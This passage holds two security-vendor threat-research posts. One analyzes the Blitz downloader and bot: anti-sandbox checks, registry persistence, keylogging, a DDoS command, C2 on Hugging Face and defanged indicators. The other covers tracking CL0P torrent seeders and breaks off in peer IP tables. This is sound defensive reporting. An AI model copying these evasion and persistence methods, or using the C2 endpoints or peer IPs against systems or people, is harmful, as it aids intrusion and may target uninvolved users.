(e.g., 1024x768, 800x600 or 640x480) - The ANY.RUN device driver \\\\?\\\\A3E64E55_fl exists - Known sandbox and virtual environment registry values/keys exist Figure 14 shows the same fake error code 137 as the NerestPC cheat displayed when a condition of the sandbox checks is met.\nNext, the backdoored cheat retrieves the Blitz downloader using the same PowerShell one-liner as the backdoored NerestPC cheat shown earlier, in Figure 9.\nThe backdoored Elysium cheat creates the same persistence entry in the Windows registry as the backdoored NerestPC cheat shown earlier in Figure 11, but it also creates a backup persistence method in case this fails.\nThe backdoored cheat creates an additional Windows registry entry at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run named EdgeUpdatershown in Figure 15.\nThe remaining functionality of the backdoored Elysium cheat is identical to the backdoored NerestPC cheat, except for the actual cheat procedures, as each is using a different commercial cheat program.\nWhen the victim reboots their system, the next stage (ieapfltr.dll) executes after they log in.\nTechnical Analysis of Blitz Malware As previously noted, Blitz malware consists of two stages: the Blitz downloader and the Blitz bot.\nBoth stages of Blitz malware use a REST API for C2 communications.\nThis REST API is built with the FastAPI framework and uses a Hugging Face Space.\nThe Space also hosts the Blitz bot and an XMRig cryptocurrency miner that we have seen as follow-up malware.\nBlitz Downloader The Blitz downloader ieapfltr.dll has a compilation timestamp of April 12, 2025, 8:40 a.m. (UTC) and a single exported function Run.\nWhen the persistence method executes this function, the downloader decrypts a list of API function strings and dynamically resolves them.\nIt uses these functions for subsequent procedures.\nNext, it performs the same anti-sandbox checks as the backdoored Elysium cheat noted earlier in Figure 13.\nBefore trying to download the bot payload, the Blitz downloader checks the system’s internet connectivity.\nIf it detects no internet connection, it sleeps for a few seconds before checking again.\nThe Blitz downloader will continue checking for internet connectivity in an infinite loop until an internet connection is detected.\nWhen the downloader detects an internet connection, it retrieves the bot payload from a Hugging Face Space.\nIt uses an HTTP GET request for the URL hxxps[:]//e445a00fffe335d6dac0ac0fe0a5accc-9591beae439b860-b5c7747.hf[.]space/6E6D73.\nThis endpoint returns the bot payload from the Hugging Face Space.\nFinally, the Blitz downloader checks whether the Windows application RuntimeBroker.exe is running, so it can inject the downloaded Blitz bot payload into the process.\nIf RuntimeBroker.exe is not running, the Blitz downloader starts the application and injects the Blitz bot payload into the running process.\nBlitz Bot The Blitz bot payload has a compilation time of April 9, 2025, 9:52 a.m. (UTC).\nThis malware uses “blitz” in several of its function names, which is where we get its name.\nBlitz bot implements code from the open-source tool curl into its own codebase, and the bot uses this curl capability for almost all of its network functionality.\nBlitz bot’s exported functions have intact function names, providing insights into its functionality.\nFigure 16 shows the bot’s functions exposed using IDA Pro.\nAs the function names in Figure 16 show, Blitz bot has the following functionality: - Keylogging - Taking screenshots - Downloading/uploading files - Injecting code Each time one of these functions is executed, Blitz bot decrypts a list of API function strings to dynamically resolve them for subsequent usage, much like the Blitz downloader does.\nThen, Blitz bot also performs the same anti-sandbox checks as the downloader and the backdoored Elysium cheat, noted earlier in Figure 13.\nAfter creating a mutex 7611646b02ffd5de6cb3f41d0721f2ba, Blitz bot retrieves the following system information: - Hardware profile globally unique identifier (GUID) string - Current work directory - Username Blitz bot encodes the current work directory value as a Base64 string and converts the victim's Windows user account name to a hexadecimal string.\nThe bot registers this information from an infected host with its C2 infrastructure by making an HTTP POST request to hxxps[:]//e445a00fffe335d6dac0ac0fe0a5accc-9591beae439b860-b5c7747.hf[.]space/6174727A that forwarded to hxxp[:]//176.65.137[.]44/6174727A. Blitz bot sends the collected victim data to this endpoint in the format shown in Figure 17.\nAs noted in Figure 17, the hardware profile GUID is labeled auth, the Windows account username is labeled name, and the current working directory is labeled cwd.\nWhen successful, the C2 server responds by sending back the same hardware profile GUID, which the bot uses in subsequent communications with the C2 infrastructure.\nNext, the bot checks for any operational issues, such as the registration process failing or the malware operator commanding a manual restart from their control panel by sending an HTTP GET request to hxxps[:]//e445a00fffe335d6dac0ac0fe0a5accc-9591beae439b860-b5c7747.hf[.]space/67726C64/[HardwareProfileGUID].\nIf the C2 server responds with false, no restart is needed.\nIf it responds with true, Blitz bot restarts itself by retrieving the value from the logon script persistence entry (shown in Figure 11) and running it.\nAfterwards, Blitz bot starts its keylogging function.\nThe keylogging function constantly writes the logged keystrokes, program name and log time into a file %temp%\\RestartManager.log.\nBlitz bot also downloads an XMRig cryptocurrency miner to the victim’s system and runs it.\nHowever, before retrieving the miner, Blitz bot checks if the infected host is already running an instance of the miner.\nIt does so by checking for the existence of a mutex 9bdcf5f16cb8331241b2997ef88d2a67.\nIf this doesn’t exist, it downloads the miner by sending a request to hxxps[:]//e445a00fffe335d6dac0ac0fe0a5accc-9591beae439b860-b5c7747.hf[.]space/6E6D72.\nThis C2 endpoint returns the Monero (XMR) cryptocurrency miner binary, which the bot injects into explorer.exe.\nBlitz bot receives commands from the C2 server through periodic HTTP GET requests to hxxps://e445a00fffe335d6dac0ac0fe0a5accc-9591beae439b860-b5c7747.hf[.]space/6774/[HardwareProfileGUID].\nTable 1 shows the commands implemented by Blitz bot.\n| Command | Purpose | | keydump | Upload and then delete the keylogger file %temp%\\RestartManager.log | | screenshot | Create a screenshot (PNG) and store it under %temp%\\[RandomName] Upload and then delete the file | | cd | Expand the environment-variable strings with the one followed after the command cd and set it as the current directory | | strss | Do an HTTP GET request for a specified URL for a specific number of times (DDoS) | | [Unknown] | Run a cmd.exe command and send the result via an HTTP POST and the data template {\"output\": [Base64EncodedCmdResult], \"cwd\": [Base64EncodedCurrentWorkDirectory]} to the C2 | Table 1.\nBlitz bot commands.\nHugging Face Abuse As mentioned, Blitz abuses a Hugging Face Space as part of its C2 architecture and for hosting the Blitz bot and XMR cryptocurrency miner payloads.\nThe malware operator created two Spaces, but only one was running in late April 2025.\nFigure 18 shows a screenshot of the malware operator’s Hugging Face account activity as of April 2025.\nThe Blitz malware operator developed the C2 communications as a REST API using the Python FastAPI framework.\nHugging Face provides a built-in solution for hosting a FastAPI application.\nThe malware operator abused this option to host the C2 API to communicate with Windows hosts infected with Blitz bot.\nFigure 19 shows the C2 files along with the payloads hosted on the running Space.\nTable 2 shows a description of each file.\n| Filename | Description | | .gitattributes | Git attributes file describing various file types and bot payload 64796C71 | | 64796C70.bin | RC4 encrypted XMRig miner payload (Windows DLL) | | 64796C71 | Blitz bot file (Windows DLL) | | Dockerfile | Docker configuration file | | README.md | Standard README file | | data.py | Contains classes to organize victim data and attacker commands | Table 2.\nBlitz C2 and payload file descriptions.\nThe C2 server API endpoints can be found in main.py where the FastAPI application is implemented that the first-stage downloader and bot communicate with.\nFigure 20 shows an excerpt of the file entity.py that contains the class Entity.\nWhen instantiated, this class represents itself as a bot victim.\nThe C2 uses this class to manage, process and synchronize events through the commands sent from the C2 admin panel.\nWhen Blitz infects a victim, it sends a request to hxxps://e445a00fffe335d6dac0ac0fe0a5accc-9591beae439b860-b5c7747.hf[.]space/6174727A as previously mentioned.\nThe endpoint then instantiates an object of this Entity class with the collected user information.\nFigure 21 shows an excerpt of the main C2 application in main.py.\nThis file implements the C2 endpoints used for communication between the bots and the C2 admin panel.\nThe first two endpoints /6E6D72 and /6E6D73 return the XMRig cryptocurrency miner and the bot payload upon request.\nWhile we can confirm C2 traffic to 176.65.137[.]44, like the example shown in Figure 15, we did not find Blitz bot's administration panel.\nBlitz bot's C2 traffic shows a direct correlation between various C2 API endpoints on the Hugging Face Space with the external C2 server at 176.65.137[.]44.\nThis external C2 server might also host the administration panel that commands the bots.\nVictim Distribution Through one of the C2 API endpoints, we could retrieve the full list of all registered bot infections.\nIn late April, Blitz had 289 registered infections in 26 countries.\nFigure 22 shows the distribution of victims in the top four affected countries.\nRussia accounts for the highest number of infected systems, followed by Ukraine, Belarus and Kazakhstan.\nThere was also a smaller number of infected systems in Europe, Asia, North Africa and North America.\nPrevious Blitz Version We initially discovered Blitz in late 2024 when the operator used an earlier version of this malware.\nThis earlier version also abused a Hugging Face Space for its C2 and to host the bot payload.\nThis version did not host a cryptocurrency coin miner on the Space, only the bot payload.\nFigure 23 shows the C2 and bot payloads hosted in the Space at hxxps[:]//huggingface[.]co/spaces/swizxx/blitz.net.\nFigure 24 shows excerpts from the main.py in Figure 23, which contains the C2 endpoints.\nFigure 24 also shows excerpts from bot.py (named entity.py in the later version of Blitz bot), which contains the victim bot class.\nAs noted in Figure 24, the operator did not obfuscate the endpoint and class in the previous version, unlike the current version.\nThe previous version of Blitz also had a self-described worm function it used to spread through Discord channels.\nFigure 25 shows an excerpt of the file worm.py that indicates the malware operator had spread Blitz through Discord channels.\nTo communicate with the C2 infrastructure, the malware operator used the Hugging Face URL swizxx-blitz-net.hf[.]space.\nThis version of Blitz was often distributed using trojanized installers for legitimate software.\nWe have included a few example hashes of this older version in the Indicators of Compromise section.\nThe VirusTotal entry for swizxx-blitz-net.hf[.]space contains a more comprehensive list of sample hashes.\nThe End?\nAfter we released timely threat intelligence information about Blitz at the end of April 2025, the malware operator posted an update in their Telegram channel on May 2 as shown in Figure 26.\nThe translation of the first post (Google Translate) is as follows: “Recently, I found out that the Elysium cheat had a Trojan that seriously worsened the PC’s security.\nSome people also reported the possible presence of a miner.\nConsidering that I can’t leave all this without attention, I made a program that will clean the PC from these things like RAT/miner, and return the system to a normal state.\nIf you have a Trojan, the console will have a yellow inscription, otherwise green.\nUpd: If someone gave software from this channel to friends, please tell them about it.”\nThe malware operator claimed that any malware associated with the game cheats were spread through the original Elysium cheat rather than through the malware operator's packaged version of it.\nAs an apparent goodwill gesture, the malware author developed a removal tool called cleaner.exe for channel members to remove Blitz from their systems.\nThe second post translates to: “I also want to inform you that I am leaving.\nThe reason is that most of the cheats simply put the system at risk, and I do not want to continue doing this.\nIn addition, my personal affairs, such as university sessions and other obligations, take up more and more time, and I cannot devote due attention to this area.\nI am really sorry to leave, but, unfortunately, this is the only right decision in the current situation.\nThank you all” This goodbye statement is likely a cover story to disguise the author's exit for other reasons.\nWe analyzed the uploaded removal tool cleaner.exe, and we can confirm it is indeed a working Blitz system cleaner.\nWhen executed, it removes the Blitz downloader ieapfltr.dll from the %localappdata%\\Microsoft\\Internet Explorer directory.\nIt also tries to remove the registry persistence entries, which only works for the logon script method (see Figure 11), but not for the backup run method (Figure 15).\nThe malware operator made a mistake, deleting the value EdgeUpdate from the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run rather than the value EdgeUpdater used by Blitz.\nThis is a good reminder that programs created by malware authors often do not undergo rigorous quality testing.\nUnexpected behavior is likely to occur.\nFigure 27 shows the console window of the cleaner.exe tool run on a system that had been infected with Blitz.\nConclusion This threat research article provided a detailed technical analysis of Blitz malware, which consists of two phases: the Blitz downloader and the Blitz bot.\nWe also reviewed its distribution through backdoored game cheats, the abuse of Hugging Face to host C2 infrastructure, and the alleged quitting of the malware author.\nWe highly recommend that people avoid downloading and using cracked software, including cracked game cheats.\nEngaging with such software not only violates legal and ethical standards, but this activity also exposes your system to significant security risks, including malware like Blitz.\nPalo Alto Networks Protections and Mitigations Palo Alto Networks customers are better protected from Blitz malware through Advanced WildFire, with its different memory analysis features.\nAdvanced URL Filtering and Advanced DNS Security identify known domains and URLs associated with this activity as malicious.\nThe Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block the attacks with best practices via the following Threat Prevention signature 87014.\nCortex XDR and XSIAM are designed to: - Prevent the execution of known malicious malware, and also prevent the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module. -\nDetect post-exploit activity with behavioral analytics, through Cortex XDR Pro.\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) - UK: +44.20.3743.3660 - Europe and Middle East: +31.20.299.3130 - Asia: +65.6983.8730 - Japan: +81.50.1790.0200 - Australia: +61.2.4062.7950 - India: 00080005045107 Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise SHA256 Hashes of Initial Backdoored NerestPC Game Cheats - 14467edd617486a1a42c6dab287ec4ae21409a5dc8eb46d77b853427b67d16d6 - 1bd55796ec712a98cf30fac404b29fcb2cdaa355cb596edcc12d8fbd918b4138 - 2007069b32bb9a7f87298fe3c1a87443c21f187ab8465c5b4a1505f0e5c7b898 - 3099f41fb60e6f7fe5c1ae2141d4ac5d6f78c763f8cf3e68b2f154cf1a93faa7 - 3c77173659b8049b96ca08fc1b8c6122e8d0cfb365920028dc3d18e95cf32ab2 - 49b50765749c5e95c2010d790a691689b01e3f844636cd0d47e9fcfe346d7f40 - 541a94110a0f9f73722bb9dd7d05b8d1822ad496084d39a777cb39f3b092b6e1 - 54f254344ddff0763208c9739bd774d6f467009faa49d47468a8505c0e60dcfc - 6e8f4286ff63acda3a04fca3af7f9fc0962dc84ce889c0b51e5e5768043cbdad - 7dd49c0128aaec33d33a5897cee0b79e91c935f1530993e5c845e35e03d7ed78 - 84b654b32b478144d9eec3d923d7e387ec3aed83d7640c32a4d1f5e593750b80 - 931b5b2436c1d7f0ab9cfd6202dd18096d94317fdb7b492b63b16b730e2dff24 - 9994bb896944e667b1d1536fa64a235501817540bc6c338790d2f46d58b512c1 - a2e9b708c7352205b62c2609d1fe43a034f7eb498daf116fb1f85ba2fb01b08b - a8d65fcf7c0f46fd761191b959571a7cc52ae8d0860c79595a28ad2a56d50186 SHA256 Hashes of Initial Backdoored Elysium Game Cheats - 056fb07672dac83ef61c0b8b5bdc5e9f1776fc1d9c18ef6c3806e8fb545af78c - 1697daef685ce47578e44e2d19fa8e01c755de7fa297716b89e764ea046db1a0 - 1d9f12e356367c533ef756ab74d70fc537a580ec5ab904a4d583cebe0b89b4c4 - 23086a1d207166154a1b1451f3174f7c5f5299dd4385d83fd8199833ce34325f - 27d074c6cfb079be8d087a0efa0ec24994972d1033fb4c72a2b479790cb3bb31 - 2a279f345126141019fe836cea88f61e5b0449487a5a411bac53ad8273a3eac1 - 2e543a246f3390bd3f9102af275e4a57f2c057bedad10079f5d2402ad9bd6421 - 3064b4dd3e2c44c986f2c247a888c530b855db8fd7dd6d345cf187d873792fc7 - 35696115cfd23a6d128da932be20a784f2a82ff411eca99c2c33bb2d1bd4026c - 39d8a45108ab3ec5b56aca989f268c434957fa1dc160d0fe654cf0d5910bf4ce - 3aaaab12ad5cc2571bf935ab248419c535577220571f76f84a37db5623956da9 - 3f85d0c73ec6c8e45a24df14759f351aaf456d1eab3afbacc1d8ed95bb062a7b - 450e33d866848c10ed3493bb1edf0a95084b8d69b963fb0aa72ba8d27c3110ab - 46f11cbba1fea180d03b5ac2b68070cbbfa515131957db1d0551209220f7f045 - 4f8031cabbc1f5b7574dbde4a251f8cb15ea8b0f7c151bdbb301dd017fedc944 - 5ca0bc0b16b2107048b804936b8d52f90e3ba3a6bf7916732541cd1b3b6f962f - 5d30045ce82f6e2431d6fd4dccb3ffd565820617d92763993dbbf4ddb9dde938 - 67b3b8b8c63e2fa103143efc67536c0fe6a58f9e004e362c3df686951f59e2e0 - 688754743476df47e612190ef790105efab8c611a5b5e2cbecb3c6b764bb9dd7 - 7b4aa0351f8fb71f0e1ccedc6998fc06945f1a77c7fb15f3448eaa483190a111 - 7dc8f1ab3638fb64b809078856ac7500a1b8aa1bcf6bc74e88af59b7e3a31407 - 839b2b72fc672549e7daefc08d28e74768d0b2b2b12662b799f46340e8bccf80 - 83fc11bebb07f59cc86e2fd4c80936ecc6d1e0a21978ba1a9b09d3639f64844d - 84a1d2bfe9bba6387e3752978aec1c0871fecf7844e23b72e4d6a046f58f4692 - 995740e8cf0b6c44b1e3dbd1e983f3fdaa2dac6bd6db399efabd957794cf3954 - 99598079794e4ff65a641828e1403b75362a7f732db4c938b9ded25f789d1793 - 9a5b4a4770c6d26fcd06dd53fc68dc5ee739fd5ed52530e80b5dfd4314dcbc6d - 9c802ce1c678791b23a04027997d6cfa4ba1b2f0d54d9fb1051d870f05c2a746 - b1d7fb16f057318c1f0727a46df7ad755361311ba22eddd1f5d397ef0e648c42 - b3bfa58ca38918d97ead9a0f7f799b08fbc082f9f844ef765c3acda4711b2888 - b43451cb80a77e30b4db51b371ad410e22a8921cd015cb4362dcdecd7a0fadce - b8c37133dc58e4f46efcac7254dee28c6cca6c9627d0d6ab0741fbce370996c2 - bbaa7bdd67822be567c1ed749c1ea42322bb1b9bc06470977597c7bf385f5aad - c0309ce6f86c5e83d18422a045367f7f9148b8b013093113bf08de4a262c1ee7 - c3520f7fc3452106ce43f17ea7db90d72c7ffed28a0d9431c84900cfdc08cfa7 - c6161b8f85c15f2a88f1dcb5204161ce7c294aa408cba11dabf57a016d8d548f - d7d98f3427bf7fa0f936472e9abaedfc38ea3e1a83a6c3bddec55b177b70e743 - fa0d069156d4913607fed8321ff5f7f4758a51e9ece2d00ccade8cb2e40e3374 - 6a55b7b01a8f7001e0e654f5feddcd0561b3694bcd2a9f9ca3e5f5e33dbbfc11 - 8ed77eb6cd203e20b467d308bf7ee5213cbb2c055c4896b0af04e323bf67b887 - ce1940eb26f0609fc25aaecbf998d01f5a7d5420c91bfe5c4b710d057981850c SHA256 Hashes of First-Stage Downloaders - 0e80fe5636336b70b1775e94aaa219e6aa27fcf700f90f8a5dd73a22c898d646 - cacc1f36b3817e8b48fabbb4b4bd9d2f1949585c2f5170e3d2d04211861ef2ac - aa5cd0219e8a0bd2e7d6c073f611102d718387750198bff564c20ca7ebada309 - f3b7bbe1079974fd505abaadbcf4dc0517620592eacbbe5f314a76775dd760c2 - cdf192e92d14b9d7e1201c23621c4e0b8ee0673c192bdd734afd97519afef271 - 6441e7000713f96c7ae114ce62378556d01fa29d435a5be0f11a5e80be9a26ed - b1b1ce259fcf5127c3477e278c3696dc7d15db63b673fdcf75e1deb89a0f6fd1 - 5ef29d6d4f72e62e0d5a1d0b85eed70b729cd530c8cb2745c66a25f5b5c7299e - 5fc132b054099a1a65f377a3a22b003a6507107f3095371b44dbf5e098b02295 - b18e21e50f1c346c83c4cba933b6466ada22febaafa25c03ac01122a12164375 - a34a4a7c71de2d4ec4baf56fd143d27eeedebb785a2ba3e0740b92e62efd81ea - bedeafd3680cad581a619fb58aa4f57ed991c4a8dd94df46ef9cbd08a8dd6052 SHA256 Hashes of Blitz Bot Payloads - ae2f4c49f73f6d88b193a46cd22551bb31183ae6ee79d84be010d6acf9f2ee57 - 88e2d0d59a9751e4ce5223951f5a75b1731b1ee82d18705aba83ba4bd7e8e5c1 SHA256 Hashes of XMRig Coin Miner - 47ce55095e1f1f97307782dc4903934f66beec3476a45d85e33e48d63e1f2e15 SHA256 Hashes of Previous Blitz Version Files - abcc59ab11b6828ad76a4064d928b9d627a574848a5a6e060b22cb27cd11b015 - 7891bb5a4656469ada072f0081c5149251b9ad49dfcf64bdb02704edaa73548a - b795cbacd5bf60399a3885e69dc7b2cbc75e8ddae01cee15e3c9fe1a3f953aa9 - c53f86ca9dba6930087b564a9588ecd3a1073b8886bbca387484bef937fb1598 - 2abb14bdf0f7f159c90183679729361102f0b46e5207a36c3f292adf7d0b1dd3 - 1b80f8a985027aac004ef89caf9daa2ebbec7eece4ee442270e1d417092b88ef - 7d082878c654ffdea32f15e258aae09d5375932499411b61e3b9189a2c906504 Mutex Names - 7611646b02ffd5de6cb3f41d0721f2ba - 9bdcf5f16cb8331241b2997ef88d2a67 Hugging Face Spaces - huggingface[.]co/spaces/e445a00fffe335d6dac0ac0fe0a5accc/9591beae439b860a9cf93b26b2dc97e0 - huggingface[.]co/spaces/e445a00fffe335d6dac0ac0fe0a5accc/2c5dd233ee36705a817b323471be2fe5 - huggingface[.]co/spaces/swizxx/blitz.net Hugging Face C2 Domains - e445a00fffe335d6dac0ac0fe0a5accc-9591beae439b860-b5c7747.hf[.]space - swizxx-blitz-net.hf[.]space Pastebin URLs - pastebin[.]com/raw/FSziK5eW - pastebin[.]com/raw/RzLEd17Z Paste URL - paste[.]rs/ABNe6 Catbox URLs - files.catbox[.]moe/tmcbms.dll - files.catbox[.]moe/5byj86 Telegram Channel of Malware Operator - t[.]me/sw1zzx_dev","num_sentences":202,"metadata":{"source":"blog","platform":"Unit42","filename":"Blitz"}}
{"id":73,"title":"CL0P Seeds ^_- Gotta Catch Em All!","publish_date":"2023-05-28","link":"https://unit42.paloaltonetworks.com/cl0p-group-distributes-ransomware-data-with-torrents/","clean_text":"Executive Summary The CL0P ransomware group recently began using torrents to distribute victim data after a successful campaign stealing data from thousands of companies.\nWe’ll cover the reason for this shift in methodology and what this means for visibility to the outside world.\nCL0P has been one of the ransomware groups most actively posting data about their victims on leak sites tracked by Unit 42 (second only to LockBit in 2023).\nUnit 42 consultants have recently observed CL0P in about 10 incident response cases.\nCL0P’s torrent seed infrastructure provides a unique opportunity for us to peer into the direct workings of a notorious ransomware group and provide insights into their trade craft.\nBy analyzing the existing torrent seed infrastructure that hosts the stolen data, we can get a better view into what the implications of this change are.\nTo protect the victims of this attack, and to have a little fun with one of our favorite fandoms, we’ve swapped the organizations’ names for those of Pokémon.\nPalo Alto Networks customers receive protection from CL0P ransomware and other malware through Cortex XDR.\nPalo Alto Networks customers receive protections from and mitigations for the recent MOVEit vulnerabilities in the following ways: - Cortex XDR and XSIAM agents help protect against post-exploitation activities associated with the MOVEit vulnerabilities using Behavioral Threat Protection, Anti-Webshell Protection and multiple additional security modules. -\nCortex Xpanse customers can identify external facing instances of the application through the “MOVEit Transfer” attack surface rule. -\nOrganizations can engage the Unit 42 Incident Response team for specific assistance with this threat and others.\n| Related Unit 42 Topics | Ransomware, CL0P, Linux | History of CL0P and the MOVEit Transfer Vulnerability At the end of May 2023, a software product by Progress called MOVEit was the target of a zero-day vulnerability leveraged by the CL0P ransomware group.\nCL0P has taken credit for exploiting the MOVEit transfer vulnerability.\nThe U.S. Cybersecurity and Infrastructure Agency (CISA) estimated TA505, a group known for leveraging Cl0p ransomware, has more than 3,000 U.S.-based organizations and 8,000 global organizations victims.\nThis is old news, but what happened next was quite interesting.\nTo give a little background, CL0P emerged in early 2019 and quickly became notorious for employing extortion tactics against victims to increase the pressure to pay the ransom.\nThey steal the data and release snippets of it.\nThe idea here is that the victim would rather pay than risk having their data exposed globally, which could be more damaging than any traditional ransomware activity.\nThis data is then posted on a “leak site,” as shown in Figure 1, which is served via the Onion router (Tor) network.\nDoing so allows CL0P to remain relatively anonymous behind this service. (\nNote that not all the suspected victims of mass exploitation are listed on the leak site.)\nIf you’ve ever done anything with the Tor browser in the past, you likely noticed almost immediately just how slow everything was.\nYou’re effectively sacrificing latency and throughput for anonymity.\nWhile this has improved significantly in recent years, attempting to download data from the leak sites can still prove to be a challenge simply because of the transfer speeds.\nBut what happens to download speeds when you’ve stolen data from literally thousands of companies?\nAll of a sudden you go from trying to offer up comparatively smaller amounts of data to offering an amount of data that probably forced the individuals behind CL0P to run out and load up on hard drives like they were going out of style.\nThreat actors have stolen and leaked terabytes upon terabytes of data already, and a dizzying amount of data is expected to continue to drop.\nIt’s an amount of data that hasn’t been seen before with this type of activity.\nUnexpectedly, this almost benefits the victims, because it can be impractical to acquire some of the leaks over the Onion network.\nWhy pay a ransom when no one will even be able to download the stolen data?\nThus, CL0P changed their tactics to address this new data access problem.\nThey posted on their leak site (as shown in Figure 2) that as of Aug. 15, 2023, they will begin publishing the stolen data through a number of new methods, including torrents.\nThis method leverages peer-to-peer file exchange, significantly speeding up the download process.\nTo that end, the threat actors made good on their claim and created a new leak site (shown in Figure 3) that had magnet links, which are hyperlinks that include a hash of the file.\nMost torrent clients could use these links to download the data.\nEach day threat actors have steadily released a new set of victims’ data via this method when the victims have refused to pay their extortion amount.\nInstead of trying to download a 128 GB ZIP file over the Onion network that could take days or even weeks to obtain, people can now download them at much more reasonable speeds.\nThus the pressure is back on the victims to pay.\nThere is a problem with torrents though, which is that the data has to be seeded initially, so that you can bootstrap the download speeds for everyone else.\nThis gives us a unique opportunity to get some insight into CL0P operations by identifying and analyzing the initial seeds for these torrents.\nThis identification process will be the primary focus of this blog.\nThe Torrents Before diving into the analysis aspect, it would be helpful to review some concepts of torrenting and how it functions.\nThere are two types of “torrents” you should know about.\nThere is the usual torrent file itself, which most people are familiar with, and the magnet links.\nA torrent file will include a piece of information about a tracker, and when you join the torrent, you will announce yourself to the tracker.\nThis tracker then will share peering information to the clients, so they can periodically receive updates about other peers who might have pieces of the data they are trying to download.\nThis allows the peers to rapidly connect to multiple other peers and begin exchanging the data at a higher rate.\nTrackers are great for normal exchanges, but they may not be the best for operational security because they provide a list of the peers.\nMagnet links are similar to a torrent file, but they typically do not have any tracker-related information.\nInstead, when a client loads a magnet link, it will contain a hash calculated from a number of facets of the file, which is used to uniquely identify the data the torrent represents.\nThis trackerless torrent works by connecting to one of the distributed hash table (DHT) nodes and effectively asking that node what peers it knows about, so you have someone to begin exchanging information with.\nThis process is shown below in Figure 4.\nThese peers can then exchange information about other peers they know about, and they can begin building out the web of connections that will eventually speed up the download process.\nThis decentralized approach is what CL0P has chosen for their data distribution.\nThe Plan Of course, this trackability is not news to anyone who has ever used BitTorrent before.\nAuthorities, law firms and others have used this mechanism to track peers connecting to torrents for piracy-related activities for years.\nYou might remember in the late 1990s when the Recording Industry Association of America (RIAA) took legal action against Napster.\nWhat followed was years of individuals being sued for participating in these peering exchanges because these organizations could identify the IP addresses of the connected peers.\nSo what makes this any different?\nThe main differentiating factor here is that we’re not dealing with one torrent for one stolen movie, but hundreds of individual torrents.\nThese torrents each require an initial seed for peers to connect to, to begin downloading and exchanging the data.\nThis creates a window of opportunity wherein only one peer will have 100% of the file while the rest of the peers are downloading the pieces of it.\nThe name of the game with identification is speed, and two factors play into this.\nFirst, the speed in which you can join this decentralized swarm.\nSecond, the speed in which you peer with the initial 100% seeder.\nNeither of these factors are terribly reliable when dealing with just one torrent.\nHowever, it paints a much different picture when you look at things from a 10,000 foot view with all the torrent data combined.\nAdmittedly, I was a little late to start this research and missed the first days of their announcements before I took an interest in it.\nThis means that I joined the torrents later in their lifecycle and the resulting 100% peers are not as reliable as the original seeders.\nTo counteract this effect, I looked at all the peers across the torrents as the threat actors released them and cross-referenced with the older torrents.\nThis allowed me to see which ones are likely “real” seeders vs. other people who have downloaded the data.\nBefore moving on, I need to include just one quick caveat here.\nMany people download these data leaks for various reasons.\nSometimes it’s for nefarious reasons such as credential harvesting, IP theft or further exploitation of the victim.\nHowever, there are a number of other entities that download this data with good intentions.\nThey use it to further help the victim or other organizations, or for research.\nWhile I cannot infer intent, I can at least compare the behavior of both groups of entities to understand what a “seeder” looks like versus someone downloading it for other reasons.\nThe Approach Like I mentioned before, speed is essential.\nThere is a small window of time to join a torrent and with each passing second the likelihood of finding the original seeder diminishes.\nTo address this problem, I need to constantly monitor their leak sites for new announcements and then use the magnet link to begin the peering process.\nOnce connected to the torrent, I can sit in the swarm and monitor for peers until I find the first one displaying a 100% complete status.\nAt this point, I log the information and remove myself from the swarm.\nIn an effort to protect the innocent, I have changed all the victim organization names to Pokémon, which also happens to align with the theme of trying to capture and collect all the seeders!\nStandard legal disclaimer: The listed organizations are not associated with Nintendo – we’re just big fans and enjoy a fun analogy.\nWhen I’m connected to a torrent, this is what the ideal output will look like.\n| $ cat pikachu.out | ||||| | Address | Flags | Done | Down | Up | Client | | 81.19.135.21 | DEHI | 100.0 | 0.0 | 0.0 | | | Transmission 3.00 | This output should include the following: - IP address of the connected peer - Flags for the peer status - Percentage complete - Up/down speeds - Torrent client In this case, the flags DEHI mean that: - I am (D)ownloading from the peer - Using an (E)ncrypted connection - I learned of the peer via a D(H)T node as opposed to peer exchange - The peer is an (I)ncoming connection All this data is useful for analysis.\nIn this case, I was connected to a single peer that had 100% completion right after the announcement was made and thus I can reliably assume this is an original seeder.\nI’ll come back to this later and discuss this particular IP address at length.\nThese next two are examples of when I was late to the party and did not get enough reliable information to make any determinations with this data alone.\n| $ cat squirtle.out | ||||| | Address | Flags | Done | Down | Up | Client | | 5.62.43[.]184 | D?EHI | 0.0 | 0.0 | 0.0 | µTorrent 3.6.0 | | 85.12.61[.]195 | TDHI | 0.0 | 0.0 | 0.0 | qBittorrent 4.5.4 | | 96.241.165[.]117 | TDHI | 0.0 | 0.0 | 0.0 | BitWombat 1.3.0.2 | | 113.30.151[.]125 | TD?EHI | 0.0 | 0.0 | 0.0 | BitTorrent 7.0.0 | | 151.20.161[.]85 | DEHI | 100.0 | 0.0 | 0.0 | Transmission 2.93 | | 178.62.25[.]161 | TDHI | 0.0 | 0.0 | 0.0 | qBittorrent 4.4.1 | | 183.60.144[.]94 | TDHI | 0.0 | 0.0 | 0.0 | libtorrent (Rasterbar) 2.0.7 | | 187.170.4[.]251 | DEHI | 100.0 | 0.0 | 0.0 | Transmission 2.93 | | 192.142.226[.]133 | D?EHI | 0.0 | 0.0 | 0.0 | µTorrent 3.6.0 | | 195.94.15[.]255 | D?EHI | 0.0 | 0.0 | 0.0 | µTorrent 3.6.0 | | 223.109.147[.]211 | TDHI | 0.0 | 0.0 | 0.0 | libtorrent (Rasterbar) 2.0.7 | | $ cat charmander.out | ||||| | Address | Flags | Done | Down | Up | Client | | 2003:ec:9711:2000:6576:cf7d:d597:cb42 | TDEI | 100.0 | 0.0 | 0.0 | Transmission 4.03 | | 2800:40:1a:7a1:cb7:dc6c:b8d1:9593 | TDEH | 100.0 | 0.0 | 0.0 | qBittorrent 4.6.0 | | 2a01:e0a:aa4:7b30:c87b:ad9b:7a44:2692 | TDEH | 0.0 | 0.0 | 0.0 | qBittorrent 4.5.4 | | 93.209.109[.]154 | DEI | 100.0 | 0.0 | 0.0 | Transmission 4.03 | | 162.120.136[.]148 | TD?EH | 0.0 | 0.0 | 0.0 | µTorrent 3.6.0 | | 190.210.32[.]85 | DEHI | 100.0 | 0.0 | 0.0 | 